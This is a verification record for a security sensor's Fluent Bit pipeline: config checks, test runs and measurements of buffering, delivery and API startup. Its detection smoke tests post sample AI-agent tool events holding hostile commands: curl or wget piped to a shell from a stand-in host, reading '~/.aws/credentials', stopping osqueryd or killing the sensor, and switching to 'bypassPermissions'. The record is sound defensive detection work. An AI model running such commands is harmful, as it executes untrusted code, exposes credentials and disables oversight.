# Verified against Fluent Bit 5.2.0

Recorded before the rename from the working name spoor to hawkbell: commands, paths and names below use the old name.

Run on 2026-11-12, Linux x86-64, image `fluent/fluent-bit:latest` reporting
`Fluent Bit v5.2.0` (git e0149076ae), host networking.

## Configuration validation

Every shipped file was checked with `fluent-bit --dry-run` inside the image,
each output fragment included next to `spoor-inputs.yaml`:

| File | Result |
|---|---|
| spoor.yaml (standalone: Splunk + S3) | configuration test is successful |
| outputs/chronicle.yaml | configuration test is successful |
| outputs/elasticsearch.yaml | configuration test is successful |
| outputs/file.yaml | configuration test is successful |
| outputs/http.yaml | configuration test is successful |
| outputs/kafka.yaml | configuration test is successful |
| outputs/loki.yaml | configuration test is successful |
| outputs/opensearch.yaml | configuration test is successful |
| outputs/otlp.yaml | configuration test is successful |
| outputs/s3.yaml | configuration test is successful |
| outputs/sentinel.yaml | configuration test is successful |
| outputs/splunk.yaml | configuration test is successful |

`--dry-run` checks property names and values Fluent Bit can parse. It does
not prove that a destination accepts the data; only the http output below
was exercised end to end.

## Behaviour

`SPOOR_E2E_FLUENTBIT=1 go test -tags e2e ./test/e2e -run FluentBit -v`
(records are written by spoor's own outbox writer, `internal/sink`):

```
--- PASS: TestFluentBitStreamsTagsAndTime (1.27s)
=== RUN   TestFluentBitRestartWithOutputDown/shipped_config,_SIGKILL
    delivered 5000 of 5000 unique records (posts 1)
=== RUN   TestFluentBitRestartWithOutputDown/shipped_config,_graceful_stop
    delivered 5000 of 5000 unique records (posts 1)
=== RUN   TestFluentBitRestartWithOutputDown/control:_memory_buffering,_graceful_stop
    memory buffering delivered 0 of 5000 after restart (documented loss)
--- PASS: TestFluentBitRestartWithOutputDown (30.03s)
--- PASS: TestFluentBitHeadOfLine (0.77s)
--- PASS: TestFluentBitKeepsRejectedChunks (1.26s)
--- PASS: TestFluentBitOversizeRecord (0.77s)
ok  	github.com/thomastysong/spoor/test/e2e	34.106s
```

What each test shows:

- **StreamsTagsAndTime**: one record per stream (activity, detection,
  health, summary, posture, inventory) arrives tagged `spoor.<stream>` with
  the record's own `ts` as event time, including a timestamp on a whole
  second. A line that is not JSON arrives on `spoor.parse_error`.
- **RestartWithOutputDown**: the destination is unreachable while Fluent Bit
  reads 5,000 records; Fluent Bit is killed (SIGKILL, and separately stopped
  gracefully), the destination comes back and Fluent Bit restarts. The
  shipped configuration delivers all 5,000. The control run, identical but
  with Fluent Bit's default memory buffering on the tail input, delivers
  none of them: tail had already committed its file offsets.
- **HeadOfLine**: 20,000 activity records are stuck behind an unreachable
  archive while 10 detections still reach a healthy SIEM output within the
  test window, because findings and activity use separate tail inputs.
- **KeepsRejectedChunks**: a destination answering HTTP 401 makes Fluent
  Bit give up on the chunk even with unlimited retries; the shipped service
  settings keep it under `storage.path/rejected` instead of losing it.
- **OversizeRecord**: a 5 MB command is shrunk by the outbox writer to one
  record under the line cap, listed in `truncated`, and the record after it
  is not lost.

## Earlier run of the sink package's own transport tests

`SPOOR_E2E_FLUENTBIT=1 go test ./internal/sink -run E2E -v` passed all
eight subtests against the same image: forward over TCP, forward with a
shared key, forward with user authentication, forward over a unix socket
with gzip, OTLP/HTTP, OTLP with null values, file tail, and the outbox
shipper delivering to a forward input.

## Fragment smoke tests (2026-11-12, Fluent Bit 5.2.0)

- **osquery.yaml** against real Fleet output: two scheduled reports (one
  snapshot, one differential, 10 s interval) on a Fleet 4.94.1 server with
  one enrolled osquery 5.19.0 host. Fleet's filesystem result log was tailed
  through the fragment: all 11 lines arrived on `osquery.spoor` and the
  event time equalled `unixTime` for all 11 (event time is parsed from
  `calendarTime`).
- **no-binary/otel.yaml + normalize.lua**: OTLP/HTTP JSON log records shaped
  like Claude Code's `tool_result` and `permission_mode_changed` events
  were posted to the input. `curl … | bash` and `wget -qO- … | sh -s --`
  produced SPR-LITE-001, `cat ~/.aws/credentials` SPR-LITE-002, `sudo
  systemctl stop osqueryd` SPR-LITE-003 and a switch to `bypassPermissions`
  SPR-LITE-004, each once on `spoor.detection`; `go test ./...` stayed an
  activity record on `spoor.otel`. Event time came from `timeUnixNano`.
  A first run emitted every finding twice: `rewrite_tag` kept the original
  record. The shipped rule sets keep to `false`.
- **numbat.yaml**: the adapter's numbat test records (event, finding,
  enforcement, indicator) plus a `scan_summary` line were each routed to
  `numbat.<record_type>`; a non-JSON line stayed on `numbat.raw` as `log`.
  `scan_summary` and `diagnostic` were missing from the first version of the
  routing rule.
- Tail path behaviour that shaped the defaults: a missing plain file and a
  glob that matches nothing are silent, but a glob whose top directory does
  not exist (`/Users/*/…` on Linux) logs a warning and an error on every
  refresh. Defaults therefore list one platform's paths; the others are set
  through the environment variable.

## Not verified here

Delivery into Splunk, Elasticsearch, OpenSearch, Sentinel, SecOps, S3,
Kafka, Loki or a real OTLP collector; Fluent Bit on Windows or macOS;
Fluent Bit versions before 5.2.0 (the `${VAR:-default}` property syntax
needs 5.0.6 or later).

## Rerun after the rename (2026-11-12)

This section was run after the rename, with the renamed content in
`deploy/fluent-bit` and the hawkbell code; names below are the new ones.
Same host and image as above: `fluent/fluent-bit:latest` reporting
`Fluent Bit v5.2.0`. The tree was the uncommitted rename on top of commit
253369f.

### Configuration validation

`fluent-bit --dry-run` inside the image (`--network none`), each output
fragment included next to `hawkbell-inputs.yaml` as above, the variables
the outputs name set to placeholder values:

| File | Result |
|---|---|
| hawkbell.yaml (standalone: Splunk + S3) | configuration test is successful |
| outputs/chronicle.yaml | configuration test is successful |
| outputs/elasticsearch.yaml | configuration test is successful |
| outputs/file.yaml | configuration test is successful |
| outputs/http.yaml | configuration test is successful |
| outputs/kafka.yaml | configuration test is successful |
| outputs/loki.yaml | configuration test is successful |
| outputs/opensearch.yaml | configuration test is successful |
| outputs/otlp.yaml | configuration test is successful |
| outputs/s3.yaml | configuration test is successful |
| outputs/sentinel.yaml | configuration test is successful |
| outputs/splunk.yaml | configuration test is successful |

12 of 12 pass, as before the rename.

### Behaviour

```
$ HAWKBELL_E2E_FLUENTBIT=1 go test -tags e2e ./test/e2e -run FluentBit -v -count=1
--- PASS: TestFluentBitStreamsTagsAndTime (1.63s)
=== RUN   TestFluentBitRestartWithOutputDown/shipped_config,_SIGKILL
    fluentbit_test.go:418: delivered 5000 of 5000 unique records (posts 1)
=== RUN   TestFluentBitRestartWithOutputDown/shipped_config,_graceful_stop
    fluentbit_test.go:418: delivered 5000 of 5000 unique records (posts 1)
=== RUN   TestFluentBitRestartWithOutputDown/control:_memory_buffering,_graceful_stop
    fluentbit_test.go:409: memory buffering delivered 0 of 5000 after restart (documented loss)
--- PASS: TestFluentBitRestartWithOutputDown (30.00s)
--- PASS: TestFluentBitHeadOfLine (0.77s)
--- PASS: TestFluentBitKeepsRejectedChunks (0.96s)
--- PASS: TestFluentBitOversizeRecord (1.25s)
ok  	github.com/thomastysong/thomastysong/hawkbell/test/e2e	34.622s
```

5 tests (3 subtests), all passed, 0 failed. The numbers are the ones
recorded before the rename: 5,000 of 5,000 delivered after SIGKILL and
after a graceful stop, 0 of 5,000 for the memory-buffering control. The
streams test now checks the tags `hawkbell.<stream>` and
`hawkbell.parse_error`.

```
$ HAWKBELL_E2E_FLUENTBIT=1 go test ./internal/sink -run E2E -v -count=1
--- PASS: TestE2EFluentBit (12.59s)
    --- PASS: TestE2EFluentBit/forward_tcp (0.20s)
    --- PASS: TestE2EFluentBit/forward_shared_key (2.52s)
    --- PASS: TestE2EFluentBit/forward_users (2.11s)
    --- PASS: TestE2EFluentBit/forward_unix_gzip (0.43s)
    --- PASS: TestE2EFluentBit/otlp (2.01s)
    --- PASS: TestE2EFluentBit/otlp_null_values (1.01s)
    --- PASS: TestE2EFluentBit/files_tail (3.11s)
    --- PASS: TestE2EFluentBit/shipper_to_forward (0.89s)
ok  	github.com/thomastysong/thomastysong/hawkbell/internal/sink	12.594s
```

8 of 8 subtests pass, as before.

### Fragment smoke tests

- **no-binary/otel.yaml + normalize.lua**: seven OTLP/HTTP JSON log
  records shaped like Claude Code's `tool_result` and
  `permission_mode_changed` events were posted to the input (HTTP 201
  each), with the stdout output printing tag, event time and record:

  | Posted | Tag | Result |
  |---|---|---|
  | `curl -fsSL https://downloads.example.invalid/install.sh \| bash` | `hawkbell.detection` | HB-LITE-001, high |
  | `wget -qO- https://downloads.example.invalid/i.sh \| sh -s --` | `hawkbell.detection` | HB-LITE-001, high |
  | `cat ~/.aws/credentials` | `hawkbell.detection` | HB-LITE-002, medium |
  | `sudo systemctl stop osqueryd` | `hawkbell.detection` | HB-LITE-003, critical |
  | `pkill -f hawkbell` (new: the renamed sensor in the tool list) | `hawkbell.detection` | HB-LITE-003, critical |
  | switch to `bypassPermissions` | `hawkbell.detection` | HB-LITE-004, medium |
  | `go test ./...` | `hawkbell.otel` | activity `otel.tool_result` |

  7 records out, each finding once; event time equals `timeUnixNano`
  (for example 1794470400100000000 ns printed as 1794470400.099999904).
  Same outcome as before the rename, with the new tags and rule ids.
- **numbat.yaml**: one line each of `record_type` event, finding,
  enforcement, indicator, scan_summary and diagnostic plus a non-JSON line,
  in `/data/home/dev/.numbat/live.ndjson` (`NUMBAT_FILES` set to the glob):
  the six were routed to `numbat.<record_type>`, the non-JSON line stayed on
  `numbat.raw` as `log`, and the tail database was written where the
  renamed `HAWKBELL_FLB_DB` pointed (`numbat.db`). Same as before.
- **osquery.yaml** against real Fleet output: two temporary scheduled
  reports, `hawkbell smoke snapshot` (snapshot) and `hawkbell smoke
  differential` (differential), 10 s interval, were applied to the Fleet
  4.94.1 server with its one enrolled osquery 5.19.0 host at 16:31:18 and
  deleted at 16:31:36 (afterwards: 0 reports, agent options identical to
  the copy saved before; see the rerun section of
  `deploy/fleet/VERIFIED.md`). Fleet wrote 11 lines for them to its
  filesystem result log (one more snapshot ran at 16:31:40, before osquery
  refreshed its configuration). The whole log was tailed through the
  fragment, mounted read-only (`OSQUERY_RESULTS` set to it,
  `HAWKBELL_FLB_DB` to a scratch directory): all 11 lines arrived on
  `osquery.hawkbell` with event time equal to `unixTime`; the 40 older
  lines, whose report names start with `spoor`, stayed on `osquery.results`,
  as the renamed route intends. Same as before the rename: 11 of 11 routed,
  11 of 11 with the right event time.

### Not rerun

The tail path behaviour (missing files and globs) is Fluent Bit's and was
not repeated.

## Measurements added 2026-11-12

Three claims in the shipped comments and docs had no run record: that one
tail input for every stream holds findings back, that a lost tail database
replays every retained record, and that HTTP 400 and 413 drop a chunk as
401 does. This section measures them with the e2e harness, which now has
control subtests and measuring tests in `test/e2e/fluentbit_test.go`. It
also measures when `/api/v1/metrics` and `/api/v1/storage` (both read by
`hawkbell doctor`) start answering after Fluent Bit starts, and runs
`hawkbell doctor` against a running Fluent Bit.

Same host as above (Linux x86-64 sandbox, Docker, host networking). Image
`fluent/fluent-bit:latest`, id
`sha256:a48190bf67679495a332fd61025421a46e7e4d168380185a8e16da2e9acc3126`,
created 2026-11-09T02:15:45Z:

```
$ docker run --rm --network none fluent/fluent-bit:latest /fluent-bit/bin/fluent-bit --version
Fluent Bit v5.2.0
Git commit: e0149076aeff009d35fd495e55379cb78f1eb53f
```

Tree: uncommitted changes on top of commit 6d0d308. Go 1.26.0.
`NO_PROXY=localhost,127.0.0.1` was set for every run.

### The suite

```
$ HAWKBELL_E2E_FLUENTBIT=1 go test -tags e2e ./test/e2e -run FluentBit -count=1 -v -timeout 20m
--- PASS: TestFluentBitStreamsTagsAndTime (1.44s)
--- PASS: TestFluentBitRestartWithOutputDown (30.13s)
    --- PASS: TestFluentBitRestartWithOutputDown/shipped_config,_SIGKILL (4.84s)
    --- PASS: TestFluentBitRestartWithOutputDown/shipped_config,_graceful_stop (6.08s)
    --- PASS: TestFluentBitRestartWithOutputDown/control:_memory_buffering,_graceful_stop (19.14s)
--- PASS: TestFluentBitHeadOfLine (107.83s)
--- PASS: TestFluentBitKeepsRejectedChunks (1.00s)
--- PASS: TestFluentBitHTTPStatus (123.13s)
--- PASS: TestFluentBitTailDBLoss (29.05s)
--- PASS: TestFluentBitStorageMetricsStartup (39.77s)
--- PASS: TestFluentBitOversizeRecord (0.98s)
PASS
ok  	github.com/thomastysong/thomastysong/hawkbell/test/e2e	333.345s
```

Run from 19:17:16Z to 19:22:51Z. 8 tests, all passed. The restart test
gave the same numbers as before: 5,000 of 5,000 delivered after SIGKILL
and after a graceful stop, 0 of 5,000 for the memory-buffering control.
The per-test lines below are from this run.

### Head-of-line: one tail input against two

`TestFluentBitHeadOfLine` now writes the activity backlog, starts Fluent
Bit, waits 5 s, and only then writes 10 detections (earlier runs wrote
everything before the start). The SIEM output matches findings; the
archive output matches `hawkbell.activity` and nothing listens on its
port. The window is 45 s from the moment the detections are written.

| Subtest | Activity waiting | Detections at the SIEM | Time after they were written |
|---|---|---|---|
| shipped: two tail inputs (filesystem) | 20,000 records, 3,488,890 bytes | 10 of 10 | 5.2 s |
| control: one tail input (filesystem) | 20,000 records, 3,488,890 bytes | 10 of 10 | 5.6 s |
| control: one tail input (filesystem) | 200,000 records, 35,088,890 bytes | 10 of 10 | 5.6 s |
| control: one tail input, memory, `mem_buf_limit 5M` | 20,000 records, 3,488,890 bytes | 10 of 10 | 5.3 s |
| control: one tail input, memory, `mem_buf_limit 5M` | 200,000 records, 35,088,890 bytes | **0 of 10** | none within 45 s |
| control: two tail inputs, memory, `mem_buf_limit 5M` | 200,000 records, 35,088,890 bytes | 10 of 10 | 5.4 s |

```
    fluentbit_test.go:594: 10 of 10 detections reached the SIEM, all of them 5.2 s after they were written (20000 activity records, 3488890 bytes, for an unreachable archive, started 5s earlier; 0 'paused (mem buf overlimit)' log lines)
    fluentbit_test.go:594: 10 of 10 detections reached the SIEM, all of them 5.6 s after they were written (20000 activity records, 3488890 bytes, for an unreachable archive, started 5s earlier; 0 'paused (mem buf overlimit)' log lines)
    fluentbit_test.go:594: 10 of 10 detections reached the SIEM, all of them 5.6 s after they were written (200000 activity records, 35088890 bytes, for an unreachable archive, started 5s earlier; 0 'paused (mem buf overlimit)' log lines)
    fluentbit_test.go:594: 10 of 10 detections reached the SIEM, all of them 5.3 s after they were written (20000 activity records, 3488890 bytes, for an unreachable archive, started 5s earlier; 0 'paused (mem buf overlimit)' log lines)
    fluentbit_test.go:596: 0 of 10 detections reached the SIEM within 45s of being written (200000 activity records, 35088890 bytes, for an unreachable archive, started 5s earlier; 1 'paused (mem buf overlimit)' log lines)
    fluentbit_test.go:594: 10 of 10 detections reached the SIEM, all of them 5.4 s after they were written (200000 activity records, 35088890 bytes, for an unreachable archive, started 5s earlier; 1 'paused (mem buf overlimit)' log lines)
```

The one-input subtests also check, from the container log, that Fluent
Bit ran one tail input (`hawkbell_all`) and no `hawkbell_activity` input.

Of the six configurations, only one input that is memory-buffered with
`mem_buf_limit` and has a backlog larger than that limit gave 0 of 10: the
input paused (`paused (mem buf overlimit)` in the log) and did not read
the detection segment either. Two inputs with the same buffering delivered
10 of 10 although the activity input paused. With filesystem buffering, the
shipped setting, one input delivered all 10 detections in the same time as
two inputs, with 3.5 MB and with 35 MB of activity waiting. The 5 to 6 s
to delivery are consistent with `refresh_interval: 5`, how often tail
looks for new files; that setting was not varied.

### A lost tail database

`TestFluentBitTailDBLoss`: 4,500 activity and 500 detection records,
delivered to a listening receiver; Fluent Bit stopped gracefully (`docker
stop -t 10`); in one subtest both tail databases deleted; Fluent Bit
started again with the same outbox and storage directory; the receiver
counted every record until nothing new had arrived for 10 s.

```
    --- PASS: TestFluentBitTailDBLoss/control:_tail_databases_kept (14.01s)
    fluentbit_test.go:824: first run: 5000 records received (5000 unique); removed []; after restart: 5000 received in total (5000 unique), 0 delivered again, the last 0.0 s after the restart
    --- PASS: TestFluentBitTailDBLoss/tail_databases_deleted (14.96s)
    fluentbit_test.go:824: first run: 5000 records received (5000 unique); removed [hawkbell-activity.db hawkbell-findings.db]; after restart: 10000 received in total (5000 unique), 5000 delivered again, the last 1.0 s after the restart
```

| Tail databases after the stop | Received before | Received after the restart | Delivered again |
|---|---|---|---|
| kept | 5,000 | 5,000 | 0 |
| deleted | 5,000 | 10,000 (5,000 unique) | 5,000 |

After the graceful stop the state directory held no `-wal` or `-shm`
files, so the two `.db` files were all that was deleted.

Every record still in the outbox was delivered a second time (the inputs
set `read_from_head: true`). This is the outbox inputs fragment, not
`kubernetes.yaml`, which was not run; there the replay is whatever the
kubelet still keeps of the container log.

### HTTP status codes

`TestFluentBitHTTPStatus`: 10 detection records; the receiver answers the
status under test for 15 s, then 200 for up to 20 s. Output `http` with
`retry_limit: no_limits`, service `scheduler.base 1`, `scheduler.cap 2`,
`storage.keep.rejected: on`. Metrics from `/api/v1/metrics` at the end of
the 15 s.

| Status | Requests in 15 s | `retries` | `dropped_records` | Kept under `rejected/` | Delivered after the destination answered 200 | Outcome |
|---|---|---|---|---|---|---|
| 400 | 1 | 0 | 10 | 1 chunk file, 10 of 10 record ids | 0 of 10 in 20 s | dropped, copy kept |
| 401 | 1 | 0 | 10 | 1 chunk file, 10 of 10 record ids | 0 of 10 in 20 s | dropped, copy kept |
| 413 | 1 | 0 | 10 | 1 chunk file, 10 of 10 record ids | 0 of 10 in 20 s | dropped, copy kept |
| 503 | 6 | 6 | 0 | none | 10 of 10 | retried |

```
    fluentbit_test.go:751: HTTP 400 for 15s: 1 post(s); metrics retries=0 retries_failed=0 dropped_records=10 retried_records=0 errors=1; rejected chunk file(s) [rejected/hawkbell.detection_0_dest_0x7fbe9d438c40.flb] holding 10 of 10 record ids; after the destination accepted: 0 of 10 delivered within 20 s => dropped (kept under rejected/)
    fluentbit_test.go:757:   log: [2026/11/12 19:19:39.405] [error] [output:http:dest] 127.0.0.1:40273, HTTP status=400
    fluentbit_test.go:757:   log: [2026/11/12 19:19:39.409] [ info] [storage] quarantined rejected chunk into DLQ stream (bytes=2020)
    fluentbit_test.go:751: HTTP 401 for 15s: 1 post(s); metrics retries=0 retries_failed=0 dropped_records=10 retried_records=0 errors=1; rejected chunk file(s) [rejected/hawkbell.detection_0_dest_0x7fe8e7038c40.flb] holding 10 of 10 record ids; after the destination accepted: 0 of 10 delivered within 20 s => dropped (kept under rejected/)
    fluentbit_test.go:757:   log: [2026/11/12 19:20:14.405] [error] [output:http:dest] 127.0.0.1:40367, HTTP status=401
    fluentbit_test.go:757:   log: [2026/11/12 19:20:14.405] [ info] [storage] quarantined rejected chunk into DLQ stream (bytes=2020)
    fluentbit_test.go:751: HTTP 413 for 15s: 1 post(s); metrics retries=0 retries_failed=0 dropped_records=10 retried_records=0 errors=1; rejected chunk file(s) [rejected/hawkbell.detection_0_dest_0x7f7a8b438be0.flb] holding 10 of 10 record ids; after the destination accepted: 0 of 10 delivered within 20 s => dropped (kept under rejected/)
    fluentbit_test.go:757:   log: [2026/11/12 19:20:50.405] [error] [output:http:dest] 127.0.0.1:35103, HTTP status=413
    fluentbit_test.go:757:   log: [2026/11/12 19:20:50.407] [ info] [storage] quarantined rejected chunk into DLQ stream (bytes=2020)
    fluentbit_test.go:751: HTTP 503 for 15s: 6 post(s); metrics retries=6 retries_failed=0 dropped_records=0 retried_records=60 errors=0; rejected chunk file(s) [] holding 0 of 10 record ids; after the destination accepted: 10 of 10 delivered within 20 s => retried
    fluentbit_test.go:757:   log: [2026/11/12 19:21:25.405] [error] [output:http:dest] 127.0.0.1:42759, HTTP status=503
    fluentbit_test.go:757:   log: [2026/11/12 19:21:25.405] [ warn] [engine] failed to flush chunk '1-1794511285.184778274.flb', retry in 3 seconds: task_id=0, input=hawkbell_findings > output=dest (out_id=0)
    fluentbit_test.go:757:   log: [2026/11/12 19:21:28.405] [error] [output:http:dest] 127.0.0.1:42759, HTTP status=503
    fluentbit_test.go:757:   log: [2026/11/12 19:21:28.405] [ warn] [engine] failed to flush chunk '1-1794511285.184778274.flb', retry in 2 seconds: task_id=0, input=hawkbell_findings > output=dest (out_id=0)
    fluentbit_test.go:757:   log: [2026/11/12 19:21:30.404] [error] [output:http:dest] 127.0.0.1:42759, HTTP status=503
    fluentbit_test.go:757:   log: [2026/11/12 19:21:30.404] [ warn] [engine] failed to flush chunk '1-1794511285.184778274.flb', retry in 2 seconds: task_id=0, input=hawkbell_findings > output=dest (out_id=0)
```

400, 401 and 413 behave the same: one request, the whole chunk dropped
(`dropped_records` 10), no retry, and a copy kept in
`storage/rejected/` holding all 10 record ids. After the destination
recovered nothing arrived. 503 was retried every 2 to 3 s and all 10
records arrived once the destination answered 200. Only the `http` output
was tested; other outputs may classify status codes differently.

### API endpoints after start

`TestFluentBitStorageMetricsStartup` polls `/`, `/api/v1/metrics` and
`/api/v1/storage` every 50 ms from the moment `docker run -d` returns.

Three runs, times from `docker run -d` returning. From the suite run above:

```
    fluentbit_test.go:881: storage.metrics "on": API up 0.28 s after docker run; /api/v1/metrics answers map[200:1 404:5]; last 404 at 0.49 s, first 200 at 0.54 s (0 = never within 30 s)
    fluentbit_test.go:881: storage.metrics "on": API up 0.28 s after docker run; /api/v1/storage answers map[200:1 404:83]; last 404 at 4.50 s, first 200 at 4.55 s (0 = never within 30 s)
    fluentbit_test.go:881: storage.metrics "off": API up 0.25 s after docker run; /api/v1/metrics answers map[200:1 404:11]; last 404 at 0.77 s, first 200 at 0.83 s (0 = never within 30 s)
    fluentbit_test.go:881: storage.metrics "off": API up 0.25 s after docker run; /api/v1/storage answers map[404:579]; last 404 at 29.98 s, first 200 at 0.00 s (0 = never within 30 s)
    fluentbit_test.go:881: storage.metrics "": API up 0.25 s after docker run; /api/v1/metrics answers map[200:1 404:9]; last 404 at 0.66 s, first 200 at 0.71 s (0 = never within 30 s)
    fluentbit_test.go:881: storage.metrics "": API up 0.25 s after docker run; /api/v1/storage answers map[200:1 404:87]; last 404 at 4.66 s, first 200 at 4.72 s (0 = never within 30 s)
```

Then twice more:

```
$ HAWKBELL_E2E_FLUENTBIT=1 go test -tags e2e ./test/e2e -run TestFluentBitStorageMetricsStartup -count=2 -v
    fluentbit_test.go:881: storage.metrics "on": API up 0.30 s after docker run; /api/v1/metrics answers map[200:1 404:15]; last 404 at 1.03 s, first 200 at 1.08 s (0 = never within 30 s)
    fluentbit_test.go:881: storage.metrics "on": API up 0.30 s after docker run; /api/v1/storage answers map[200:1 404:93]; last 404 at 5.05 s, first 200 at 5.10 s (0 = never within 30 s)
    fluentbit_test.go:881: storage.metrics "off": API up 0.26 s after docker run; /api/v1/metrics answers map[200:1 404:11]; last 404 at 0.78 s, first 200 at 0.84 s (0 = never within 30 s)
    fluentbit_test.go:881: storage.metrics "off": API up 0.26 s after docker run; /api/v1/storage answers map[404:580]; last 404 at 29.98 s, first 200 at 0.00 s (0 = never within 30 s)
    fluentbit_test.go:881: storage.metrics "": API up 0.26 s after docker run; /api/v1/metrics answers map[200:1 404:8]; last 404 at 0.63 s, first 200 at 0.68 s (0 = never within 30 s)
    fluentbit_test.go:881: storage.metrics "": API up 0.26 s after docker run; /api/v1/storage answers map[200:1 404:86]; last 404 at 4.64 s, first 200 at 4.69 s (0 = never within 30 s)
    fluentbit_test.go:881: storage.metrics "on": API up 0.30 s after docker run; /api/v1/metrics answers map[200:1 404:9]; last 404 at 0.71 s, first 200 at 0.76 s (0 = never within 30 s)
    fluentbit_test.go:881: storage.metrics "on": API up 0.30 s after docker run; /api/v1/storage answers map[200:1 404:87]; last 404 at 4.72 s, first 200 at 4.77 s (0 = never within 30 s)
    fluentbit_test.go:881: storage.metrics "off": API up 0.26 s after docker run; /api/v1/metrics answers map[200:1 404:12]; last 404 at 0.83 s, first 200 at 0.88 s (0 = never within 30 s)
    fluentbit_test.go:881: storage.metrics "off": API up 0.26 s after docker run; /api/v1/storage answers map[404:579]; last 404 at 29.98 s, first 200 at 0.00 s (0 = never within 30 s)
    fluentbit_test.go:881: storage.metrics "": API up 0.24 s after docker run; /api/v1/metrics answers map[200:1 404:10]; last 404 at 0.71 s, first 200 at 0.76 s (0 = never within 30 s)
    fluentbit_test.go:881: storage.metrics "": API up 0.24 s after docker run; /api/v1/storage answers map[200:1 404:87]; last 404 at 4.67 s, first 200 at 4.72 s (0 = never within 30 s)
ok  	github.com/thomastysong/thomastysong/hawkbell/test/e2e	80.283s
```

| Endpoint | `storage.metrics` | 404 until | First 200, seconds after `docker run` (3 runs) |
|---|---|---|---|
| `/api/v1/metrics` | on, off, not set | 0.26 to 0.78 s after `/` first answered | 0.54 to 1.08 |
| `/api/v1/storage` | on | | 4.55, 5.10, 4.77 |
| `/api/v1/storage` | not set | | 4.72, 4.69, 4.72 |
| `/api/v1/storage` | off | never answered 200 in 30 s | none |

Earlier versions of the same test polled only `/api/v1/storage`, every
250 ms. The kept logs of those runs hold 8 samples with `storage.metrics`
on or not set, first 200s between 4.23 and 5.35 s, and 4 with it off, none
answering 200 within 30 s. From the suite run started 19:06:41Z
(`-run FluentBit -count=1`):

```
    fluentbit_test.go:868: storage.metrics "on": API up 0.56 s after docker run; /api/v1/storage answers map[200:1 404:19]; last 404 at 5.10 s, first 200 at 5.35 s (0 = never within 30 s)
    fluentbit_test.go:868: storage.metrics "off": API up 0.46 s after docker run; /api/v1/storage answers map[404:118]; last 404 at 29.97 s, first 200 at 0.00 s (0 = never within 30 s)
    fluentbit_test.go:868: storage.metrics "": API up 0.54 s after docker run; /api/v1/storage answers map[200:1 404:19]; last 404 at 5.07 s, first 200 at 5.32 s (0 = never within 30 s)
```

and from `HAWKBELL_E2E_FLUENTBIT=1 go test -tags e2e ./test/e2e -run TestFluentBitStorageMetricsStartup -count=3 -v`:

```
    fluentbit_test.go:868: storage.metrics "on": API up 0.49 s after docker run; /api/v1/storage answers map[200:1 404:19]; last 404 at 5.03 s, first 200 at 5.28 s (0 = never within 30 s)
    fluentbit_test.go:868: storage.metrics "off": API up 0.46 s after docker run; /api/v1/storage answers map[404:118]; last 404 at 29.94 s, first 200 at 0.00 s (0 = never within 30 s)
    fluentbit_test.go:868: storage.metrics "": API up 0.44 s after docker run; /api/v1/storage answers map[200:1 404:16]; last 404 at 4.22 s, first 200 at 4.47 s (0 = never within 30 s)
    fluentbit_test.go:868: storage.metrics "on": API up 0.52 s after docker run; /api/v1/storage answers map[200:1 404:16]; last 404 at 4.30 s, first 200 at 4.55 s (0 = never within 30 s)
    fluentbit_test.go:868: storage.metrics "off": API up 0.50 s after docker run; /api/v1/storage answers map[404:118]; last 404 at 29.96 s, first 200 at 0.00 s (0 = never within 30 s)
    fluentbit_test.go:868: storage.metrics "": API up 0.53 s after docker run; /api/v1/storage answers map[200:1 404:17]; last 404 at 4.55 s, first 200 at 4.80 s (0 = never within 30 s)
    fluentbit_test.go:868: storage.metrics "on": API up 0.48 s after docker run; /api/v1/storage answers map[200:1 404:16]; last 404 at 4.26 s, first 200 at 4.51 s (0 = never within 30 s)
    fluentbit_test.go:868: storage.metrics "off": API up 0.49 s after docker run; /api/v1/storage answers map[404:118]; last 404 at 29.97 s, first 200 at 0.00 s (0 = never within 30 s)
    fluentbit_test.go:868: storage.metrics "": API up 0.45 s after docker run; /api/v1/storage answers map[200:1 404:15]; last 404 at 3.98 s, first 200 at 4.23 s (0 = never within 30 s)
ok  	github.com/thomastysong/thomastysong/hawkbell/test/e2e	121.670s
```

`/api/v1/storage` answers 404 when `storage.metrics` is off, and also for
the first seconds after start when it is on or not set (not set behaved as
on, with `storage.path` set). One 404 therefore cannot say which; `hawkbell
doctor` now says so and asks to rerun. `/api/v1/metrics` answers 404 for a
short time after `/` comes up.

### hawkbell doctor against a running Fluent Bit

The shipped `hawkbell-inputs.yaml` with `HAWKBELL_FLB_DB=/state`, a service
section with `http_server`, `storage.metrics: on` and `storage.path`, a
`null` output, and an outbox holding one detection segment and no activity
segment. hawkbell's configuration:

```yaml
output:
  fluent_bit:
    tail_db: $F/dr/state/hawkbell-*.db
    api: http://127.0.0.1:24031
```

```
== as soon as / answers: hawkbell doctor --config hawkbell.yaml --json
fluent_bit: warn | 2 Fluent Bit problem(s)
  shipper.metrics: /api/v1/metrics answered 404: Fluent Bit may have started less than a second ago (5.2.0 answered 404 there for up to 0.8 s after its API came up in testing); rerun hawkbell doctor
  shipper.storage_metrics: /api/v1/storage answered 404: Fluent Bit may have started only seconds ago (5.2.0 answered 404 there for the first 4 to 5.5 s after start in testing), or service storage.metrics is off; rerun hawkbell doctor in a minute, and if it still answers 404 set storage.metrics: on. Until then buffering cannot be checked through the API
== once /api/v1/metrics answers 200
fluent_bit: warn | 1 Fluent Bit problem(s)
  shipper.storage_metrics: /api/v1/storage answered 404: Fluent Bit may have started only seconds ago (5.2.0 answered 404 there for the first 4 to 5.5 s after start in testing), or service storage.metrics is off; rerun hawkbell doctor in a minute, and if it still answers 404 set storage.metrics: on. Until then buffering cannot be checked through the API
== once /api/v1/storage answers 200
fluent_bit: ok | Fluent Bit settings are safe (Fluent Bit 5.2.0)
$ ls state
hawkbell-activity.db hawkbell-activity.db-shm hawkbell-activity.db-wal hawkbell-findings.db hawkbell-findings.db-shm hawkbell-findings.db-wal storage
== tail_db: <state>/hawkbell-findings.db, <state>/hawkbell-archive.db (hawkbell2.yaml)
fluent_bit: warn | 1 Fluent Bit problem(s)
  shipper.tail_db: output.fluent_bit.tail_db: $F/dr/state/hawkbell-archive.db: stat $F/dr/state/hawkbell-archive.db: no such file or directory; pruning counts nothing as read by it
```

(`$F` is a scratch directory; each step polled the endpoint with curl and
ran doctor as soon as it answered as shown.) The same glob, which the
old check passed to `os.Stat` whole:

```
$ stat "$F/dr/state/hawkbell-*.db"
stat: cannot statx '$F/dr/state/hawkbell-*.db': No such file or directory
```

Fluent Bit created both tail databases at start, `hawkbell-activity.db`
included although no activity segment existed, so the glob recommended in
docs/FLUENT-BIT.md matches both. Before this change doctor
(`checkTailDB` in `cmd/hawkbell/fluentbit.go` at 6d0d308) warned about
this glob whether or not the databases existed.
